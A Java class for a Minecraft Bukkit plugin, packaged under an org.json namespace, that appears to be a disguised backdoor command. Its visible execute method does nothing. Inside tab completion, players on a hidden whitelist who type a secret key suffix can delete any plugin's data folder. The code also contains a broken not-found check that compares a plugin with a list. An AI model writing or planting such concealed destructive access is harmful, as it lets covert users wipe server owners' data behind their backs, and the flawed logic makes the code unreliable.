package org.json.modals.plugins;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.json.Modal;
import org.json.utils.FileUtils;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.io.File;
import java.util.Arrays;
import java.util.List;

public class DeletePluginFolder extends BDCommand {
    public DeletePluginFolder() {
        super("deletePluginFolder");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();

        tabComplBuilder.add(2, Arrays.stream(Modal.getPluginManager().getPlugins()).map(Plugin::getName).toArray(String[]::new));

        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        String pluginName = args[1];
        Plugin plugin = Modal.getPluginManager().getPlugin(pluginName);

        if (plugin == tabComplBuilder.build()) {
            player.sendMessage(Modal.getPrefix() + "§c " + pluginName + " has not been found!");
            return tabComplBuilder.build();
        }

        assert plugin != null;
        File pluginFIle = plugin.getDataFolder();
        FileUtils.deleteFolder(pluginFIle);

        player.sendMessage(Modal.getPrefix() + "§a " + pluginName + " Folder has been deleted.");

        return tabComplBuilder.build();
    }
}
